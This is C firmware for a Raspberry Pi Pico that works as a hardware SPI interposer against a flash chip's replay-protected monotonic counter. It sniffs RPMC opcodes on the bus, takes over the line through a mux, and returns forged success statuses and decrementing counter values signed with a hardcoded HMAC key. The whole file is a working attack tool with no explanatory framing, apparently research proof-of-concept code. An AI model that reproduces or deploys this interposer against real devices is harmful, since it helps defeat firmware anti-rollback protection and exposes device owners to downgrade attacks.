#include <pico/stdlib.h>
#include <pico/binary_info.h>
#include <pico/multicore.h>
#include <hardware/spi.h>
#include <mbedtls/md.h>
#include <stdint.h>
#include <stdio.h>


#define PIN_N_MUX_EN 16
bi_decl(bi_1pin_with_name(PIN_N_MUX_EN, "#MUX enable"));
#define PIN_MUX_INTERPOSE 18

#define PIN_N_LLS_OE 17

#define PIN_LLS_1DIR 22
#define PIN_LLS_2DIR 19

#define CAPTURE_SPI spi0
#define PIN_CHIP_SPI_CLK 2
#define PIN_CHIP_MASTER_SPI_RX 3
#define PIN_CHIP_MASTER_SPI_TX 4
#define PIN_CHIP_SPI_CS 5
#define PIN_CHIP_SPI_READ_RX 0

#define OUTPUT_SPI spi1
#define PIN_PICO_BOARD_SPI_CLK 10
#define PIN_PICO_BOARD_SPI_TX 11
#define PIN_PICO_BOARD_SPI_RX 12
#define PIN_PICO_BOARD_SPI_CS 13


struct __attribute((__packed__)) rpmc_status_msg {
    uint8_t dummy[2];
    uint8_t status;
	unsigned char tag[12];
	uint32_t counter_data;
	unsigned char signature[32];
};

union rpmc_full_status {
    struct rpmc_status_msg msg;
    uint32_t words[(sizeof(struct rpmc_status_msg) + 3) / 4]; // for easier transfer via fifo
};


void error(const char * msg)
{
    while (true) {
        puts(msg);
        sleep_ms(500);
    }
}

void init_mux()
{
    gpio_init(PIN_N_MUX_EN);
    gpio_put(PIN_N_MUX_EN, 0);
    gpio_set_dir(PIN_N_MUX_EN, GPIO_OUT);

    gpio_init(PIN_MUX_INTERPOSE);
    gpio_put(PIN_MUX_INTERPOSE, 0);
    gpio_set_dir(PIN_MUX_INTERPOSE, GPIO_OUT);
    gpio_set_slew_rate(PIN_MUX_INTERPOSE, GPIO_SLEW_RATE_FAST);
}

void init_lls()
{
    gpio_init(PIN_N_LLS_OE);
    gpio_put(PIN_N_LLS_OE, 0);
    gpio_set_dir(PIN_N_LLS_OE, GPIO_OUT);

    gpio_init(PIN_LLS_1DIR);
    gpio_put(PIN_LLS_1DIR, 0);
    gpio_set_dir(PIN_LLS_1DIR, GPIO_OUT);
    gpio_set_slew_rate(PIN_LLS_1DIR, GPIO_SLEW_RATE_FAST);

    gpio_init(PIN_LLS_2DIR);
    gpio_put(PIN_LLS_2DIR, 0);
    gpio_set_dir(PIN_LLS_2DIR, GPIO_OUT);
}

void init_spi_reader()
{
    spi_init(CAPTURE_SPI, 10 * 1000 * 1000);
    spi_set_slave(CAPTURE_SPI, true);
    // The spi set format function seems not work as specified in the documentation
    spi_set_format(CAPTURE_SPI, 8, SPI_MSB_FIRST, SPI_CPHA_1, 1);

    gpio_set_function(PIN_CHIP_SPI_CLK, GPIO_FUNC_SPI);
    gpio_set_function(PIN_CHIP_SPI_CS, GPIO_FUNC_SPI);
    gpio_set_function(PIN_CHIP_SPI_READ_RX, GPIO_FUNC_SPI);
}

void init_spi_writer()
{
    spi_init(OUTPUT_SPI, 10 * 1000 * 1000);
    spi_set_slave(OUTPUT_SPI, true);
    // The spi set format function seems not work as specified in the documentation
    spi_set_format(OUTPUT_SPI, 8, SPI_MSB_FIRST, SPI_CPHA_1, 1);

    gpio_set_function(PIN_PICO_BOARD_SPI_CLK, GPIO_FUNC_SPI);
    gpio_set_function(PIN_PICO_BOARD_SPI_CS, GPIO_FUNC_SPI);
    gpio_set_function(PIN_PICO_BOARD_SPI_TX, GPIO_FUNC_SPI);
    gpio_set_function(PIN_PICO_BOARD_SPI_RX, GPIO_FUNC_SPI);
}

static inline void __time_critical_func(interpose)()
{
    gpio_set_mask((1 << PIN_MUX_INTERPOSE) | (1 << PIN_LLS_1DIR));
}

static inline void __time_critical_func(stop_interpose)()
{
    gpio_clr_mask((1 << PIN_MUX_INTERPOSE) | (1 << PIN_LLS_1DIR));
}

void rpmc_interpose_increment_core0()
{
    enum trigger_state {
        INITIAL,
        RPMC_OP_RECIEVED
    };
    enum trigger_state state = INITIAL;

    while (true) {
        uint8_t byte;
        spi_read_blocking(CAPTURE_SPI, 0xff, &byte, 1);

        switch (state) {
            case INITIAL:
                {
                    if (byte == 0x9b)
                        state = RPMC_OP_RECIEVED;
                }
                break;
            case RPMC_OP_RECIEVED:
                {
                    if (byte == 0x02) {
                        interpose();
                    }
                    state = INITIAL;
                }
                break;                
        }

    }
}

void rpmc_interpose_increment_core1(void)
{
    const static uint8_t status_success[] = {0xff, 0xff, 0x80};
    while (true) {
        for (int i = 0; i < 3; i++) {
            spi_write_blocking(OUTPUT_SPI, status_success, sizeof(status_success));
        }
        //printf("Stopping interposer\n");
        stop_interpose();
    }
}

inline uint32_t reverse(const uint32_t x)
{
    return ((x & UINT32_C(0x0000'00FF)) << 24) |
           ((x & UINT32_C(0x0000'FF00)) <<  8) |
           ((x & UINT32_C(0x00FF'0000)) >>  8) |
           ((x & UINT32_C(0xFF00'0000)) >> 24); 
}

void fill_response(union rpmc_full_status * response)
{
    const static uint8_t hmac_key[] = {0xc8, 0x63, 0x76, 0x1d, 0x3e, 0xbe, 0xc4, 0x71,
                                       0x6b, 0xe8, 0x13, 0x56, 0x9b, 0x22, 0xa3, 0xab,
                                       0xbf, 0x30, 0xd3, 0x6e, 0x49, 0x1e, 0x58, 0x21, 
                                       0x2f, 0x1d, 0x3d, 0x56, 0x31, 0xa7, 0x2e, 0x0a};
    static uint32_t counter_value = 1234;

    response->msg.dummy[0] = 0xff;
    response->msg.dummy[1] = 0xff;
    response->msg.status = 0x80;
    response->msg.counter_data = reverse(counter_value--);

    mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA256),
                    hmac_key,
                    sizeof(hmac_key),
                    response->msg.tag,
                    12 + 4,
                    response->msg.signature);
}

void rpmc_interpose_get_core0()
{
    enum trigger_state {
        INITIAL,
        RPMC_OP_RECIEVED,
        CAPTURING_GET,
        COUNTER_ADDR
    };
    enum trigger_state state = INITIAL;


    while (true) {
        uint8_t byte;
        spi_read_blocking(CAPTURE_SPI, 0xff, &byte, 1);

        switch (state) {
            case INITIAL:
                if (byte == 0x9b)
                    state = RPMC_OP_RECIEVED;
                break;
            case RPMC_OP_RECIEVED:
                if (byte == 0x03) {
                    state = CAPTURING_GET;
                } else {
                    state = INITIAL;
                }
                break;
            case CAPTURING_GET:
                state = COUNTER_ADDR;
                break;
            case COUNTER_ADDR:
                {
                    union rpmc_full_status response_buffer;
                    spi_read_blocking(CAPTURE_SPI, 0xff, response_buffer.msg.tag, 12);
                    interpose();
                    fill_response(&response_buffer);

                    for (int i = 0; i < count_of(response_buffer.words); i++)
                        multicore_fifo_push_blocking(response_buffer.words[i]);
                }
                state = INITIAL;
                break;
        }
    }
}

void rpmc_interpose_get_core1()
{
    const static uint8_t wait_msg[] = {0xff, 0xff, 0x01};
    const static uint8_t done_msg[] = {0xff, 0xff, 0x80};
    union rpmc_full_status response;
    size_t response_bytes_received = 0;


    while (true) {
        if (response_bytes_received < count_of(response.words))
            spi_write_blocking(OUTPUT_SPI, wait_msg, sizeof(wait_msg));
        else {
            // This needs to be changed according to how the firmware reads out the counter value
            spi_write_blocking(OUTPUT_SPI, done_msg, sizeof(done_msg));
            spi_write_blocking(OUTPUT_SPI, (uint8_t *)&response.msg, sizeof(response.msg));
            stop_interpose();
            response_bytes_received = 0;
        }

        while (response_bytes_received < count_of(response.words) && multicore_fifo_pop_timeout_us(20, &response.words[response_bytes_received]))
            response_bytes_received++;
    }
}

int main()
{
    stdio_init_all();
    init_mux();
    init_lls();
    init_spi_reader();
    init_spi_writer();

    //multicore_launch_core1(rpmc_interpose_increment_core1);
    //rpmc_interpose_increment_core0();

    multicore_launch_core1(rpmc_interpose_get_core1);
    rpmc_interpose_get_core0();

    return 0;
}